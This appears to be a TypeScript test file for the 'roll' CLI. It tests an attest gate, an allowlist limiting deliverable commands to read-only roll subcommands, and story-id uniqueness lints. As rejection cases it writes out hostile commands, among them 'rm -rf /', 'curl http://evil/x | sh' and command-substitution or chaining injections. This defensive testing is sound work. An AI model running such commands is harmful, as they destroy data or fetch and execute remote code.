      expect(storyHasAcBlock(wt, "IDEA-MD8")).toBe(false);
      const { alerts, events, s } = sinks();
      const r = runAttestGate(wt, "IDEA-MD8", "c-md8", "hard", 1000, s);
      expect(r.verdict).toBe("produced"); // no AC block → no report required, must-declare never engages
      expect(r.blocked).toBe(false);
      expect(alerts).toHaveLength(0);
      expect(events[0]?.verdict).toBe("produced");
    });
  });

  // ── 复核 #1: deliverable_cmd roll-only allowlist + state-changing denylist ────
  describe("复核 #1: deliverable_cmd allowlist (roll read-only only) + denylist", () => {
    it("allowedDeliverableCmd: bare/path/node-form roll READ commands pass", () => {
      expect(allowedDeliverableCmd("roll status")).toBe(true);
      expect(allowedDeliverableCmd("roll pulse")).toBe(true);
      expect(allowedDeliverableCmd("roll cycles")).toBe(true);
      expect(allowedDeliverableCmd("roll")).toBe(true); // bare → help
      expect(allowedDeliverableCmd("./bin/roll.js status")).toBe(true);
      expect(allowedDeliverableCmd("bin/roll.js status")).toBe(true);
      expect(allowedDeliverableCmd("node ./bin/roll.js status")).toBe(true);
      expect(allowedDeliverableCmd("node dist/bin/roll.js cycles")).toBe(true);
      // commas in flag values are fine (the cmd is not comma-split anyway)
      expect(allowedDeliverableCmd("roll status --fmt a,b")).toBe(true);
    });

    it("allowedDeliverableCmd: ANY non-roll command is rejected (no arbitrary shell)", () => {
      expect(allowedDeliverableCmd("rm -rf /")).toBe(false);
      expect(allowedDeliverableCmd("curl http://evil/x | sh")).toBe(false);
      expect(allowedDeliverableCmd("git push origin main")).toBe(false);
      expect(allowedDeliverableCmd("./deploy.sh")).toBe(false);
      expect(allowedDeliverableCmd("node evil.js")).toBe(false); // node but not roll
      expect(allowedDeliverableCmd("echo hi && rm x")).toBe(false); // chaining
      expect(allowedDeliverableCmd("roll status; rm x")).toBe(false); // metachar chaining
      expect(allowedDeliverableCmd("roll status `whoami`")).toBe(false); // command subst
      expect(allowedDeliverableCmd("")).toBe(false);
    });

    it("allowedDeliverableCmd: roll agent list is read-only — allowed", () => {
      expect(allowedDeliverableCmd("roll agent list")).toBe(true);
      expect(allowedDeliverableCmd("node ./bin/roll.js agent list")).toBe(true);
    });

    it("allowedDeliverableCmd: roll agent disable/enable are write — rejected", () => {
      expect(allowedDeliverableCmd("roll agent disable kimi")).toBe(false);
      expect(allowedDeliverableCmd("roll agent enable kimi")).toBe(false);
    });

    it("allowedDeliverableCmd: state-changing / releasing roll subcommands are rejected", () => {
      for (const sub of ["release", "loop on", "loop off", "loop go", "story add", "idea", "agent use", "pair init", "attest US-1", "build", "design", "fix", "propose"]) {
        expect(allowedDeliverableCmd(`roll ${sub}`)).toBe(false);
      }
    });

    it("allowedDeliverableCmd: init is rejected except for the read-only diagnosis fixture", () => {
      expect(allowedDeliverableCmd("roll init")).toBe(false);
      expect(allowedDeliverableCmd("roll init --auto")).toBe(false);
      expect(allowedDeliverableCmd("roll init --diagnose --fixture state-matrix")).toBe(true);
      expect(allowedDeliverableCmd("roll init --attest-smoke existing-codebase-diagnose")).toBe(true);
      expect(allowedDeliverableCmd("roll init --attest-smoke prd-only")).toBe(true);
      expect(allowedDeliverableCmd("roll init --attest-smoke existing-codebase-diagnose --auto")).toBe(false);
      expect(allowedDeliverableCmd("node ./bin/roll.js init --diagnose --fixture state-matrix")).toBe(true);
      expect(allowedDeliverableCmd("node ./bin/roll.js init --attest-smoke existing-codebase-diagnose")).toBe(true);
    });

    it("deliverableCmds/rejectedCmds: allowed kept, rejected surfaced separately", () => {
      const wt = withSpec("FIX-S20", "---\nid: FIX-S20\ndeliverable_cmd:\n  - roll status\n  - rm -rf /\n  - roll release\n---\n# x\n\n**AC:**\n- [ ] x\n");
      expect(deliverableCmdsForStory(wt, "FIX-S20")).toEqual(["roll status"]);
      expect(rejectedDeliverableCmdsForStory(wt, "FIX-S20")).toEqual(["rm -rf /", "roll release"]);
    });

    it("gate: a rejected deliverable_cmd FAILS loud (hard-blocked) — never silently honest-skipped", () => {
      const wt = withReport("FIX-S21", 2000, '<figure class="shot"><img src="screenshots/web.png"></figure>');
      addSpec(wt, "FIX-S21", "---\nid: FIX-S21\ndeliverable_cmd: curl http://evil | sh\n---\n# x\n\n## Acceptance Criteria\n\n- [ ] x\n");
      withPeerScore(wt, "FIX-S21", 8, "good", "c-s21");
      const { alerts, events, s } = sinks();
      const r = runAttestGate(wt, "FIX-S21", "c-s21", "hard", 1000, s);
      expect(r.verdict).toBe("skipped");
      expect(r.blocked).toBe(true);
      expect(r.reasons[0]).toMatch(/非白名单|allowlist/);
      expect(alerts[0]).toContain("BLOCKED");
      expect(events[0]?.verdict).toBe("skipped");
    });

    it("gate: a state-changing roll subcommand (roll loop on) also FAILS loud", () => {
      const wt = withReport("FIX-S22", 2000, '<figure class="shot"><img src="screenshots/web.png"></figure>');
      addSpec(wt, "FIX-S22", "---\nid: FIX-S22\ndeliverable_cmd: roll loop on\n---\n# x\n\n## Acceptance Criteria\n\n- [ ] x\n");
      withPeerScore(wt, "FIX-S22", 8, "good", "c-s22");
      const { events, s } = sinks();
      const r = runAttestGate(wt, "FIX-S22", "c-s22", "hard", 1000, s);
      expect(r.verdict).toBe("skipped");
      expect(r.blocked).toBe(true);
      expect(events[0]?.verdict).toBe("skipped");
    });

    it("gate: a roll READ-ONLY deliverable_cmd with a real terminal capture PASSES", () => {
      const wt = withReport("FIX-S23", 2000, '<figure class="shot"><img src="screenshots/terminal.png"></figure>');
      addSpec(wt, "FIX-S23", "---\nid: FIX-S23\ndeliverable_cmd: roll status --fmt a,b\n---\n# x\n\n## Acceptance Criteria\n\n- [ ] cli works\n");
      withPeerScore(wt, "FIX-S23", 8, "good", "c-s23");
      writeEvidenceJson(wt, "FIX-S23", { captures: [{ kind: "terminal", out: "screenshots/terminal.png", taken: true }] });
      // comma in the flag value is one command, captured once → need 1 terminal shot
      expect(deliverableCmdsForStory(wt, "FIX-S23")).toEqual(["roll status --fmt a,b"]);
      expect(verificationReportHasContent(wt, "FIX-S23")).toBe(true);
      const { alerts, events, s } = sinks();
      const r = runAttestGate(wt, "FIX-S23", "c-s23", "hard", 1000, s);
      expect(r.verdict).toBe("produced");
      expect(alerts).toHaveLength(0);
      expect(events[0]?.verdict).toBe("produced");
    });
  });

  // ── 复核 #4: deliverable_cmd scalar is NOT comma-split (block list per line) ──
  it("复核 #4: a deliverable_cmd scalar with commas is ONE command (not shredded); block list is per-line", () => {
    const wtScalar = withSpec("FIX-S24", "---\nid: FIX-S24\ndeliverable_cmd: roll status --fmt a,b,c\n---\n# x\n\n**AC:**\n- [ ] x\n");
    expect(deliverableCmdsForStory(wtScalar, "FIX-S24")).toEqual(["roll status --fmt a,b,c"]);
    const wtBlock = withSpec("FIX-S25", "---\nid: FIX-S25\ndeliverable_cmd:\n  - roll status --fmt a,b\n  - roll cycles\n---\n# x\n\n**AC:**\n- [ ] x\n");
    expect(deliverableCmdsForStory(wtBlock, "FIX-S25")).toEqual(["roll status --fmt a,b", "roll cycles"]);
    // deliverable_url, by contrast, KEEPS comma-splitting (urls never contain commas)
    const wtUrl = withSpec("FIX-S26", "---\nid: FIX-S26\ndeliverable_url: https://a, https://b\n---\n# x\n\n**AC:**\n- [ ] x\n");
    expect(deliverableUrlsForStory(wtUrl, "FIX-S26")).toEqual(["https://a", "https://b"]);
  });

  // ── 复核 #3: ROLL_ATTEST_WEB_URL override folds the web need to 1 ─────────────
  it("复核 #3: an env override + multi declared url ⇒ web need folds to 1 (no false FAIL)", () => {
    const wt = withReport("FIX-S27", 2000, '<figure class="shot"><img src="screenshots/web.png"></figure>');
    addSpec(wt, "FIX-S27", "---\nid: FIX-S27\ndeliverable_url: [https://app.test/a, https://app.test/b]\n---\n# x\n\n## Acceptance Criteria\n\n- [ ] renders\n");
    withPeerScore(wt, "FIX-S27", 8, "good", "c-s27");
    // The override collapses webCaptureTargets to 1 → the lane produces 1 web shot.
    writeEvidenceJson(wt, "FIX-S27", { captures: [{ kind: "web", out: "screenshots/web.png", taken: true }] });
    expect(webCaptureTargetsForStory(wt, "FIX-S27", "https://deploy.live/x")).toEqual(["https://deploy.live/x"]);
    const prev = process.env["ROLL_ATTEST_WEB_URL"];
    process.env["ROLL_ATTEST_WEB_URL"] = "https://deploy.live/x";
    try {
      // With the override active, 1 real web shot now satisfies the floor.
      expect(verificationReportHasContent(wt, "FIX-S27")).toBe(true);
      const { alerts, events, s } = sinks();
      const r = runAttestGate(wt, "FIX-S27", "c-s27", "hard", 1000, s);
      expect(r.verdict).toBe("produced");
      expect(alerts).toHaveLength(0);
      expect(events[0]?.verdict).toBe("produced");
    } finally {
      if (prev === undefined) delete process.env["ROLL_ATTEST_WEB_URL"];
      else process.env["ROLL_ATTEST_WEB_URL"] = prev;
    }
    // WITHOUT the override the same single shot is insufficient (2 urls → 2 shots).
    expect(verificationReportHasContent(wt, "FIX-S27")).toBe(false);
  });
});

/**
 * FIX-340 — story id uniqueness. `storySpecPath` must FAIL LOUD on a DUPLICATE
 * id (one id resolving to two epics) rather than silently returning the
 * alphabetical-first epic's spec — the US-AGENT-001 collision that misfired the
 * active card's attest gate. No-duplicate behavior is unchanged. `findDuplicateStoryIds`
 * is the corpus lint the CI check script runs.
 */
describe("FIX-340 — story id uniqueness (storySpecPath fail-loud + corpus lint)", () => {
  function writeSpec(wt: string, epic: string, id: string, body = "# spec\n"): string {
    const dir = join(wt, ".roll", "features", epic, id);
    mkdirSync(dir, { recursive: true });
    const p = join(dir, "spec.md");
    writeFileSync(p, body);
    return p;
  }
  function writeLegacy(wt: string, epic: string, id: string): string {
    const dir = join(wt, ".roll", "features", epic);
    mkdirSync(dir, { recursive: true });
    const p = join(dir, `${id}.md`);
    writeFileSync(p, "# legacy\n");
    return p;
  }

  it("AC4 unchanged — a UNIQUE id resolves to its single spec", () => {
    const wt = tmp("uniq");
    const p = writeSpec(wt, "loop-engine", "US-AGENT-001");
    expect(storySpecPath(wt, "US-AGENT-001")).toBe(p);
    expect(storySpecMatches(wt, "US-AGENT-001")).toEqual([p]);
    expect(findDuplicateStoryIds(wt)).toEqual([]);
  });

  it("AC4 unchanged — a MISSING id returns null (no throw)", () => {
    const wt = tmp("missing");
    writeSpec(wt, "loop-engine", "US-AGENT-002");
    expect(storySpecPath(wt, "US-AGENT-999")).toBeNull();
    expect(storySpecMatches(wt, "US-AGENT-999")).toEqual([]);
  });

  it("AC1 fail-loud — a DUPLICATE id (two epics) THROWS, never silently alphabetical-first", () => {
    const wt = tmp("dup");
    // alphabetically autonomous-evolution < loop-engine — the old code returned this.
    const legacyHome = writeSpec(wt, "autonomous-evolution", "US-AGENT-001");
    const activeHome = writeSpec(wt, "loop-engine", "US-AGENT-001");
    expect(() => storySpecPath(wt, "US-AGENT-001")).toThrow(DuplicateStoryIdError);
    try {
      storySpecPath(wt, "US-AGENT-001");
    } catch (e) {
      expect(e).toBeInstanceOf(DuplicateStoryIdError);
      const err = e as DuplicateStoryIdError;
      expect(err.storyId).toBe("US-AGENT-001");
      // both homes surfaced — not the alphabetical-first silently chosen.
      expect(err.matches).toContain(legacyHome);
      expect(err.matches).toContain(activeHome);
      expect(err.message).toContain("US-AGENT-001");
      expect(err.message).toContain("一个 ID 一份 spec");
    }
  });

  it("same-epic card layout SUPERSEDES its legacy sibling — NOT a duplicate", () => {
    const wt = tmp("supersede");
    const card = writeSpec(wt, "release-management", "FIX-229");
    writeLegacy(wt, "release-management", "FIX-229"); // dead migration shadow
    // one home (the card wins), so no throw and no lint hit.
    expect(storySpecPath(wt, "FIX-229")).toBe(card);
    expect(storySpecMatches(wt, "FIX-229")).toEqual([card]);
    expect(findDuplicateStoryIds(wt)).toEqual([]);
  });

  it("legacy flat file alone resolves (back-compat) and is not a duplicate", () => {
    const wt = tmp("legacy-only");
    const p = writeLegacy(wt, "release-management", "FIX-300");
    expect(storySpecPath(wt, "FIX-300")).toBe(p);
    expect(findDuplicateStoryIds(wt)).toEqual([]);
  });

  it("AC3 corpus lint — reports EVERY id owning >1 spec home, sorted, with both paths", () => {
    const wt = tmp("lint");
    writeSpec(wt, "delivery-dossier", "IDEA-002");
    writeSpec(wt, "uncategorized", "IDEA-002");
    writeSpec(wt, "loop-engine", "IDEA-003");
    writeSpec(wt, "uncategorized", "IDEA-003");
    writeSpec(wt, "loop-engine", "US-CLEAN-001"); // unique → must NOT appear
    const dups = findDuplicateStoryIds(wt);
    expect(dups.map((d) => d.id)).toEqual(["IDEA-002", "IDEA-003"]);
    expect(dups[0]?.specs).toHaveLength(2);
    expect(dups[0]?.specs).toEqual([...(dups[0]?.specs ?? [])].sort()); // deterministic order
  });

  it("corpus lint ignores non-story directories/files", () => {
    const wt = tmp("noise");
    writeSpec(wt, "loop-engine", "US-X-001");
    // a non-id markdown file + a non-id dir must not be mistaken for a story.
    mkdirSync(join(wt, ".roll", "features", "loop-engine", "notes"), { recursive: true });
    writeFileSync(join(wt, ".roll", "features", "loop-engine", "README.md"), "# notes\n");
    expect(findDuplicateStoryIds(wt)).toEqual([]);
  });

  it("corpus lint on an absent features tree returns [] (nothing to scan)", () => {
    const wt = tmp("absent");
    expect(findDuplicateStoryIds(wt)).toEqual([]);
  });
});

/*
 * FIX-340 (AC3 "…and the backlog") — the BACKLOG half of the uniqueness lint.
 * `.roll/backlog.md` is the single queue of record: one row per story id. Two
 * rows sharing an id is the same "一个 ID 一份卡" violation the features-tree lint
 * guards. `findDuplicateBacklogStoryIds` is PURE (takes the backlog text) so it
 * needs no backlog on disk.
 */
describe("FIX-340 — backlog id uniqueness (findDuplicateBacklogStoryIds)", () => {
  const row = (id: string, rest = "desc"): string => `| [${id}](.roll/features/x/${id}/spec.md) | ${rest} | ✅ Done |`;

  it("no duplicate rows → []", () => {
    const backlog = ["# Backlog", "", "| ID | Desc | Status |", "|----|----|----|", row("US-FOO-001"), row("FIX-100"), row("IDEA-002")].join("\n");
    expect(findDuplicateBacklogStoryIds(backlog)).toEqual([]);
  });

  it("an id on TWO rows is reported with both 1-based line numbers", () => {
    const lines = ["# Backlog", "", row("US-AGENT-002"), row("FIX-100"), row("US-AGENT-002", "stale dup")];
    const dups = findDuplicateBacklogStoryIds(lines.join("\n"));
    expect(dups).toHaveLength(1);
    expect(dups[0]?.id).toBe("US-AGENT-002");
    expect(dups[0]?.lines).toEqual([3, 5]); // the two rows, 1-based
  });

  it("reports EVERY duplicated id, sorted by id", () => {
    const lines = [row("FIX-9"), row("US-Z-001"), row("FIX-9"), row("US-Z-001"), row("US-Z-001"), row("US-UNIQ-001")];
    const dups = findDuplicateBacklogStoryIds(lines.join("\n"));
    expect(dups.map((d) => d.id)).toEqual(["FIX-9", "US-Z-001"]);
    expect(dups.find((d) => d.id === "US-Z-001")?.lines).toEqual([2, 4, 5]); // all three rows
  });

  it("only the LEADING id cell counts — an id mentioned in another column is not a row key", () => {
    // the second row's id is FIX-200; US-AGENT-002 appears only in its description.
    const lines = [row("US-AGENT-002"), `| [FIX-200](p) | supersedes US-AGENT-002 | ✅ |`];
    expect(findDuplicateBacklogStoryIds(lines.join("\n"))).toEqual([]);
  });

  it("non-row lines (headers, prose, separators) are ignored", () => {
    const backlog = ["# Backlog", "Some prose mentioning FIX-100 twice: FIX-100.", "| Story | Desc |", "|---|---|", row("FIX-100")].join("\n");
    expect(findDuplicateBacklogStoryIds(backlog)).toEqual([]);
  });

  it("empty backlog text → []", () => {
    expect(findDuplicateBacklogStoryIds("")).toEqual([]);
  });
});

// ── US-SKILL-030: designContractDeliveredEvidence ───────────────────────────

describe("designContractDeliveredEvidence — US-SKILL-030 (AC4)", () => {
  function tmpProject(specText: string, storyId: string, acMap?: object[]): string {
    const p = mkdtempSync(join(tmpdir(), "roll-pvd-"));
    dirs.push(p);
    // mimic the card archive layout expected by storySpecPath
    const cardDir = join(p, ".roll", "features", "test-epic", storyId);
    mkdirSync(cardDir, { recursive: true });
    writeFileSync(join(cardDir, "spec.md"), specText);
    if (acMap !== undefined) {
      writeFileSync(join(cardDir, "ac-map.json"), JSON.stringify(acMap));
    }
    return p;
  }

  it("returns delta summary when spec has evaluation contract and ac-map exists", () => {
    const specText = `---
id: US-TEST-001
title: test story
screenshot_exempt: unit test only
---

**Evaluation contract:**
- expected_evidence:
  - kind: test
    target: foo.test.ts
    proves: AC1
- scorer_focus:
  - test coverage
`;
    const acMap = [{ ac: "AC1", status: "pass", evidence: [] }];
    const p = tmpProject(specText, "US-TEST-001", acMap);
    const result = designContractDeliveredEvidence(p, "US-TEST-001");
    expect(result).toContain("Design-contract-vs-delivered evidence:");
    expect(result).toContain("✅ test: foo.test.ts → AC1 (pass)");
  });

  it("returns empty string for legacy spec without evaluation contract", () => {
    const legacySpec = `---
id: US-OLD-001
title: old story
screenshot_exempt: test only
---

## AC
- [ ] AC1 works
`;
    const p = tmpProject(legacySpec, "US-OLD-001");
    expect(designContractDeliveredEvidence(p, "US-OLD-001")).toBe("");
  });

  it("returns empty string when story has no spec file", () => {
    const p = mkdtempSync(join(tmpdir(), "roll-pvd-nospec-"));
    dirs.push(p);
    expect(designContractDeliveredEvidence(p, "US-NOSUCH-001")).toBe("");
  });

  it("marks design contract evidence as missing when ac-map has no entry", () => {
    const specText = `---
id: US-TEST-002
title: story with missing evidence
screenshot_exempt: test only
---

**Evaluation contract:**
- expected_evidence:
  - kind: screenshot
    target: console page
    proves: AC1
- scorer_focus:
  - visual accuracy
`;
    const p = tmpProject(specText, "US-TEST-002");
    const result = designContractDeliveredEvidence(p, "US-TEST-002");
    expect(result).toContain("❓ screenshot: console page → AC1 (missing)");
  });
});

describe("FIX-1233 — cross-tree evidence roots (in-repo .roll: worktree ≠ persistent)", () => {
  /** Persistent-root fixture: report + ac-map + evidence live ONLY in the
   *  PERSISTENT tree (repoCwd), the worktree card dir has just a spec-less
   *  shell — the intel-radar layout where attest-remediation (FIX-1230)
   *  archived into repoCwd while the gate read only the worktree. */
  function crossTree(storyId: string): { wt: string; persistent: string } {
    const persistent = withReport(storyId);
    const wt = tmp("xtree-wt");
    // worktree card dir exists but carries NO report / ac-map (fresh checkout).
    mkdirSync(join(wt, ".roll", "features", "uncategorized", storyId), { recursive: true });
    return { wt, persistent };
  }

  it("verificationReportHasContent finds persistent-tree evidence via persistentCwd", () => {
    const { wt, persistent } = crossTree("US-X-001");
    // the historical bug: worktree-only read says empty shell…
    expect(verificationReportHasContent(wt, "US-X-001")).toBe(false);
    // …the two-root read sees the real delivery.
    expect(verificationReportHasContent(wt, "US-X-001", persistent)).toBe(true);
  });

  it("acMapCandidates appends persistent-root candidates (worktree first)", () => {
    const { wt, persistent } = crossTree("US-X-002");
    const cands = acMapCandidates(wt, "US-X-002", persistent);
    expect(cands.some((p) => p.startsWith(join(wt, ".roll")))).toBe(true);
    expect(cands.some((p) => p.startsWith(join(persistent, ".roll")))).toBe(true);
    expect(cands[0]?.startsWith(join(wt, ".roll"))).toBe(true);
  });

  it("verificationReportFresh honors the persistent root", () => {
    const { wt, persistent } = crossTree("US-X-003");
    expect(verificationReportFresh(wt, "US-X-003", undefined, persistent)).toBe(true);
    expect(verificationReportFresh(wt, "US-X-003")).toBe(false);
  });

  it("same-root call (persistentCwd === worktreeCwd) is unchanged behaviour", () => {
    const wt = withReport("US-X-004");
    expect(verificationReportHasContent(wt, "US-X-004", wt)).toBe(true);
  });

  it("declared-surface capture floor reads the persistent-tree manifest (pi review finding)", () => {
    // A card declaring a deliverable_cmd owes a taken:true terminal capture;
    // when evidence.json lives ONLY in the persistent tree the floor must see it.
    const storyId = "US-X-006";
    const persistent = withReport(storyId);
    const wt = tmp("xtree-wt6");
    const wtCard = join(wt, ".roll", "features", "uncategorized", storyId);
    mkdirSync(wtCard, { recursive: true });
    // spec in the WORKTREE (specs are tracked there) declaring a cmd surface.
    writeFileSync(
      join(wtCard, "spec.md"),
      `---\nid: ${storyId}\ndeliverable_cmd: roll loop status\n---\n# ${storyId}\n**AC:**\n- [ ] a\n`,
    );
    // taken terminal capture recorded in the PERSISTENT run dir's evidence.json.
    const runDir = join(persistent, ".roll", "features", "uncategorized", storyId, "latest");
    writeFileSync(
      join(runDir, "evidence.json"),
      JSON.stringify({ captures: [{ kind: "terminal", taken: true }, { kind: "web", taken: false }] }, null, 2),
    );
    // single-root read misses the manifest → floor fails; two-root read passes.
    expect(verificationReportHasContent(wt, storyId)).toBe(false);
    expect(verificationReportHasContent(wt, storyId, persistent)).toBe(true);
  });

  it("runAttestGate produces (not empty-shell) when evidence sits in the persistent tree", () => {
    const { wt, persistent } = crossTree("US-X-005");
    // fresh-session peer score note in the persistent .roll, as runScorePairing writes it.
    const noteDir = join(persistent, ".roll", "features", "uncategorized", "US-X-005", "notes");
    mkdirSync(noteDir, { recursive: true });
    writeFileSync(
      join(noteDir, "review-score.json"),
      JSON.stringify({ score: 9, sessionId: "cycle-1:score:peer", cycleId: "cycle-1" }, null, 2),
    );
    const alerts: string[] = [];
    const events: Array<{ verdict: string }> = [];
    const res = runAttestGate(
      wt,
      "US-X-005",
      "cycle-1",
      "hard",
      undefined,
      { alert: (m) => alerts.push(m), event: (p) => events.push(p) },
      persistent,
      "builder-session",
    );
    // The empty-shell false-negative is the regression under test: the verdict
    // must not be a "no AC content / no ac-map" skip. (Score-note shape may
    // still legitimately skip — assert on the reason, not the verdict.)
    expect(res.reasons.join(" ")).not.toContain("empty shell");
    expect(res.reasons.join(" ")).not.toContain("no fresh acceptance report");
  });
});


describe("FIX-1256 — attest gate and evidence gate agree on AC/no-AC stories", () => {
  function withSpecOnly(storyId: string, specText: string): string {
    const wt = tmp("fix1256");
    const dir = join(wt, ".roll", "features", "uncategorized", storyId);
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "spec.md"), specText);
    return wt;
  }

  it("no AC block: attest gate produces, evidence gate earns (no artifacts required)", () => {
    const storyId = "FIX-1256-NOAC";
    const wt = withSpecOnly(storyId, `---\nid: ${storyId}\n---\n# ${storyId}\n\nNo AC block here.\n`);
    const { s } = sinks();
    const attest = runAttestGate(wt, storyId, "c-1256", "hard", 1000, s);
    expect(attest.verdict).toBe("produced");
    expect(attest.blocked).toBe(false);

    const specText = readFileSync(join(wt, ".roll", "features", "uncategorized", storyId, "spec.md"), "utf8");
    const required = acBlockPresentInSpec(specText, storyId);
    expect(required).toBe(false);
    const evidence = evidenceGateBeforePush({
      attestReportPresent: false,
      acMapPresent: false,
      acceptanceReportRequired: required,
    });
    expect(evidence.ok).toBe(true);
  });

  it("AC block but missing artifacts: attest gate skips/blocked, evidence gate blocked", () => {
    const storyId = "FIX-1256-AC";
    const wt = withSpecOnly(storyId, `---\nid: ${storyId}\n---\n# ${storyId}\n\n**AC:**\n- [ ] something\n`);
    const { s } = sinks();
    const attest = runAttestGate(wt, storyId, "c-1256b", "hard", 1000, s);
    expect(attest.verdict).toBe("skipped");
    expect(attest.blocked).toBe(true);

    const specText = readFileSync(join(wt, ".roll", "features", "uncategorized", storyId, "spec.md"), "utf8");
    const required = acBlockPresentInSpec(specText, storyId);
    expect(required).toBe(true);
    const evidence = evidenceGateBeforePush({
      attestReportPresent: false,
      acMapPresent: false,
      acceptanceReportRequired: required,
    });
    expect(evidence.ok).toBe(false);
  });
});
